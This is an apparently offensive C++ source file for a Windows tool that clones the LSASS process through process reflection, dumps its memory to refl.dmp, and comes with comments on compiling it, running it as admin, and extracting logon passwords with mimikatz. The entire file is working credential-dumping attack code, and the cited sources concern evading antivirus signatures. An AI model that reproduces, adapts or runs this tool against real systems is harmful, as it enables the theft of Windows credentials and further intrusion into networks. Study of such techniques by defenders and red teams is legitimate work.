#include <Windows.h>
#include <processsnapshot.h>
#include <TlHelp32.h>
#include <processthreadsapi.h>
#include <winternl.h>
#include <stdio.h>
#include "nanodump.h"
#include "utils.h"

//process reflection stuff copied from: https://github.com/hasherezade/pe-sieve/blob/master/utils/process_reflection.cpp
//minidump/process searching copied from: https://ired.team/offensive-security/credential-access-and-credential-dumping/dumping-lsass-passwords-without-mimikatz-minidumpwritedump-av-signature-bypass
//compile using: cl.exe refl.cpp /DUNICODE
//as admin, run using: refl.exe
//  then use mimikatz: sekurlsa::minidump refl.dmp ; sekurlsa::logonpasswords

#pragma comment (lib, "Advapi32.lib")

#define USE_RTL_PROCESS_REFLECTION

#ifndef RTL_CLONE_PROCESS_FLAGS_CREATE_SUSPENDED
#define RTL_CLONE_PROCESS_FLAGS_CREATE_SUSPENDED 0x00000001
#endif

#ifndef RTL_CLONE_PROCESS_FLAGS_INHERIT_HANDLES
#define RTL_CLONE_PROCESS_FLAGS_INHERIT_HANDLES 0x00000002
#endif

#ifndef RTL_CLONE_PROCESS_FLAGS_NO_SYNCHRONIZE
#define RTL_CLONE_PROCESS_FLAGS_NO_SYNCHRONIZE 0x00000004 // don't update synchronization objects
#endif

#ifndef HPSS
#define HPSS HANDLE
#endif

const DWORD reflection_access = PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_DUP_HANDLE;

typedef HANDLE HPSS;

typedef struct {
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} T_CLIENT_ID;

typedef struct
{
    HANDLE ReflectionProcessHandle;
    HANDLE ReflectionThreadHandle;
    T_CLIENT_ID ReflectionClientId;
} T_RTLP_PROCESS_REFLECTION_REFLECTION_INFORMATION;

// Win >= 7
NTSTATUS(NTAPI* _RtlCreateProcessReflection) (
    HANDLE ProcessHandle,
    ULONG Flags,
    PVOID StartRoutine,
    PVOID StartContext,
    HANDLE EventHandle,
    T_RTLP_PROCESS_REFLECTION_REFLECTION_INFORMATION* ReflectionInformation
    ) = NULL;

// Win >= 8.1

extern "C"
NTSTATUS (NTAPI *_NtQueryInformationProcess)(
    IN HANDLE ProcessHandle,
    IN PROCESSINFOCLASS ProcessInformationClass,
    OUT PVOID ProcessInformation,
    IN ULONG ProcessInformationLength,
    OUT PULONG ReturnLength OPTIONAL
);

bool load_ntdll()
{
    if (_RtlCreateProcessReflection == NULL)
    {
        HMODULE lib = GetModuleHandleA("ntdll.dll");
        if (!lib) return false;

        FARPROC proc = GetProcAddress(lib, "RtlCreateProcessReflection");

        _RtlCreateProcessReflection = (NTSTATUS(NTAPI*) (
            HANDLE,
            ULONG,
            PVOID,
            PVOID,
            HANDLE,
            T_RTLP_PROCESS_REFLECTION_REFLECTION_INFORMATION*
            )) proc;

        proc = GetProcAddress(lib, "NtQueryInformationProcess");

        _NtQueryInformationProcess = (NTSTATUS(NTAPI*) (
            HANDLE,
            PROCESSINFOCLASS,
            PVOID,
            ULONG,
            PULONG))proc;

        if (_RtlCreateProcessReflection == NULL || _NtQueryInformationProcess == NULL)
            return false;
    }
    return true;
}

typedef struct {
    HANDLE orig_hndl;
    HANDLE returned_hndl;
    DWORD returned_pid;
    bool is_ok;
} t_refl_args;

BOOL WINAPI refl_creator(t_refl_args *args)
{
    NTSTATUS ret = S_OK;

    if (args != NULL)
    {
        T_RTLP_PROCESS_REFLECTION_REFLECTION_INFORMATION info = { 0 };
        ret = _RtlCreateProcessReflection(args->orig_hndl, RTL_CLONE_PROCESS_FLAGS_INHERIT_HANDLES, NULL, NULL, NULL, &info);
        if (ret == S_OK)
        {
            args->is_ok = true;
            args->returned_hndl = info.ReflectionProcessHandle;
            args->returned_pid = (DWORD)info.ReflectionClientId.UniqueProcess;
            DPRINT("RtlCreteProcessReflection: new PID: %d", (DWORD)info.ReflectionClientId.UniqueProcess);
        }
        else
        {
            args->is_ok = false;
            DPRINT("error: %d\n", GetLastError());
        }
    }
    else
    {
        ret = S_FALSE;
    }
    return (ret == S_OK);
}

static BOOL check_vad_permission(PMEMORY_BASIC_INFORMATION mbi)
{
    // ignore non-commited pages
    if (mbi->State != MEM_COMMIT)
        return FALSE;
    // ignore mapped pages
    if (mbi->Type == MEM_MAPPED)
        return FALSE;
    // ignore pages with PAGE_NOACCESS
    if ((mbi->Protect & PAGE_NOACCESS) == PAGE_NOACCESS)
        return FALSE;
    // ignore pages with PAGE_GUARD
    if ((mbi->Protect & PAGE_GUARD) == PAGE_GUARD)
        return FALSE;
    // ignore pages with PAGE_EXECUTE
    if ((mbi->Protect & PAGE_EXECUTE) == PAGE_EXECUTE)
        return FALSE;

    return TRUE;
}

PVOID get_peb_address(
    IN HANDLE hProcess)
{
#ifdef SSP
    UNUSED(hProcess);
    // if nanodump is running as an SSP,
    // avoid calling NtQueryInformationProcess
    return (PVOID)READ_MEMLOC(PEB_OFFSET);
#else
    PROCESS_BASIC_INFORMATION basic_info = { 0 };
    basic_info.PebBaseAddress = 0;

#define ProcessInformationClass 0

    NTSTATUS status = _NtQueryInformationProcess(
        hProcess,
        (PROCESSINFOCLASS)ProcessInformationClass,
        &basic_info,
        sizeof(PROCESS_BASIC_INFORMATION),
        NULL);
    if (!NT_SUCCESS(status))
    {
        DPRINT("NtQueryInformationProcess %d\n", status);
        DPRINT("Could not get the PEB of the process\n");
        return 0;
    }

    return basic_info.PebBaseAddress;
#endif
}

int main()
{
    HANDLE hToken;
    OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken);
    TOKEN_PRIVILEGES tokenPriv;
    LUID luid;
    LookupPrivilegeValue(NULL, L"SeDebugPrivilege", &luid);
    tokenPriv.PrivilegeCount = 1;
    tokenPriv.Privileges[0].Luid = luid;
    tokenPriv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    AdjustTokenPrivileges(hToken, FALSE, &tokenPriv, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL);

    DWORD lsassPID = 0;
    HANDLE lsassHandle = NULL;
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 processEntry = {};
    processEntry.dwSize = sizeof(PROCESSENTRY32);
    LPCWSTR processName = L"";
    if (Process32First(snapshot, &processEntry)) {
        while (_WCSICMP(processName, L"lsass.exe") != 0) {
            Process32Next(snapshot, &processEntry);
            processName = processEntry.szExeFile;
            lsassPID = processEntry.th32ProcessID;
        }
    }

    //lsassPID = GetCurrentProcessId();

    lsassHandle = OpenProcess(PROCESS_ALL_ACCESS, 0, lsassPID);
    DPRINT("Target PID: %d\n", lsassPID);

    load_ntdll();
    t_refl_args args = { 0 };
    args.orig_hndl = lsassHandle;
    DWORD ret = refl_creator(&args);

    if (args.returned_hndl == 0)

    DPRINT("Clone PID: %d\n", args.returned_pid);

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, args.returned_pid);

#ifdef _DEBUG
    if (hProcess != NULL)
    {
        ULONG_PTR ptr = 0;

        MEMORY_BASIC_INFORMATION mbi = {};

        do
        {
            VirtualQueryEx(hProcess, (LPVOID)ptr, &mbi, sizeof(mbi));
            if (check_vad_permission(&mbi))
            {
                DPRINT("[%p] Buffer %p size %p\n", mbi.Type, mbi.BaseAddress, mbi.RegionSize);
            }
            ptr = (ULONG_PTR) mbi.BaseAddress + mbi.RegionSize;
        } while (ptr < (0x00007fffffff0000));
    }
#endif

#ifdef _USE_DBGHELP
    HANDLE outFile = CreateFile(L"refl.dmp", GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

    DWORD retd = MiniDumpWriteDump(args.returned_hndl, args.returned_pid, outFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
    CloseHandle(outFile);
#else
    dump_context dc = {};
    dc.hProcess = hProcess;
    dc.DumpMaxSize = 0x4000000;

    dc.BaseAddress = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dc.DumpMaxSize);

    if (NanoDumpWriteDump(&dc))
    {
        HANDLE outFile = CreateFileA("refl.dmp", GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        DPRINT("Using file: refl.dmp\n");

        DPRINT("Generated output %p size %p\n", dc.BaseAddress, (PVOID)dc.DumpMaxSize);
        WriteFile(outFile, dc.BaseAddress, dc.rva, NULL, NULL);

        CloseHandle(outFile);
    }
#endif

    if (args.returned_hndl != NULL)
    {
        TerminateProcess(args.returned_hndl, 0);
        CloseHandle(args.returned_hndl);
    }
    return 0;
}
